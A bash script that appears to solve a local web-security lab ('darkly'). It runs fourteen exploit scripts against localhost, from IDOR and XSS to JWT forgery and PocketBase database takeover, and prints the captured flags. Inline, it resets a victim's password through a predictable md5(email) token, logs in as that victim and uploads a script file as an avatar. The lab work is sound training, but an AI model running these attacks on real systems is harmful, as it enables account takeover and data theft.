#!/usr/bin/env bash
#
# hack.sh - full darkly audit in one run.
# Runs every exploit in order, from zero knowledge to database takeover,
# and prints all captured flags at the end. No exploit script is modified.
#

hack_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
log=$(mktemp)
domain="http://localhost:4942"

make_blue()  { echo -e "\033[1;94m$1\033[1;0m"; }
make_green() { echo -e "\033[1;92m$1\033[1;0m"; }

step() {
    echo
    make_blue "====[ $1 ]===="
}

run() {
    bash "$hack_dir/$1" 2>&1 | tee -a "$log"
}

step "1/14  IDOR: reading wil's private profile without any login"
run "idor/exploit.sh"

step "2/14  Open redirect: /redirect sends the victim anywhere"
run "open_redirect/exploit.sh"

step "3/14  Reflected XSS: the newsletter banner echoes raw HTML"
run "reflected_xss/exploit.sh"

step "4/14  No brute force protection: dictionary attack on jdoe"
run "no_brute_force_protection/exploit.sh"

step "5/14  Predictable password reset: token is md5(email)"
bash "$hack_dir/predictable_password_reset/exploit.sh" "jdoe@student.42.tech" "hacked42" 2>&1 | tee -a "$log"

victim="benjamin@student.42.tech"
victim_token=$(printf "%s" "$victim" | md5sum | awk '{print $1}')
victim_cookie=$(mktemp)
curl -s -o /dev/null -X POST "$domain/reset-password/confirm" \
    -d "email=$victim&token=$victim_token&new_password=hacked42"
curl -s -c "$victim_cookie" -o /dev/null -X POST "$domain/login" \
    -d "identity=$victim&password=hacked42"
victim_flag=$(curl -s -L -b "$victim_cookie" "$domain/profile/me/settings" \
    | grep -oE 'FLAG\{[^}]+\}' | head -n1)
echo "Logged in as victim $victim, recovery code: $victim_flag" | tee -a "$log"
rm -f "$victim_cookie"

step "6/14  Broken access control: /api/grades leaks hidden flag and other students"
run "broken_access_control_api/exploit.sh"

step "7/14  Mass assignment: patching our own role"
run "mass_assignment/exploit.sh"

step "8/14  Stored XSS: stealing the moderation bot's cookie (may take up to 2 min)"
run "stored_xss/exploit.sh"

step "9/14  Path traversal: reading files outside the projects directory"
run "path_traversal/exploit.sh"

step "10/14  Unrestricted upload: avatar accepts any file type"
bash "$hack_dir/predictable_password_reset/exploit.sh" "jdoe@student.42.tech" "123123" >/dev/null 2>&1
run "unrestricted_upload/exploit.sh"
upload_redirect=$(curl -s -D - -o /dev/null -X POST "$domain/upload/avatar" \
    -F "file=@$hack_dir/unrestricted_upload/exploit.sh" \
    -b "$hack_dir/unrestricted_upload/cookie.txt" \
    | grep -i '^location:' | cut -d' ' -f2- | tr -d '\r')
echo "upload redirect: $upload_redirect" | tee -a "$log"
echo "$upload_redirect" | grep -oE 'upload_flag=[^&]+' | cut -d= -f2 \
    | python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.stdin.read().strip()))" | tee -a "$log"

step "11/14  XXE to SSRF: making the server fetch /internal/config"
run "xxe_to_ssrf/exploit.sh"

step "12/14  Leaked JWT secret: forging an admin session token"
run "leaked_jwt_secret/exploit.sh"

step "13/14  PocketBase admin access: full database takeover"
run "pocketbase_admin_access/exploit.sh"

step "14/14  PocketBase filter injection: breaking the search filter to dump every post"
run "pocketbase_filter_injection/exploit.sh"

echo
make_green "================= FLAGS CAPTURED ================="
grep -oE 'FLAG\{[^}]+\}' "$log" | awk '!seen[$0]++'
make_green "================================================="

rm -f "$log"
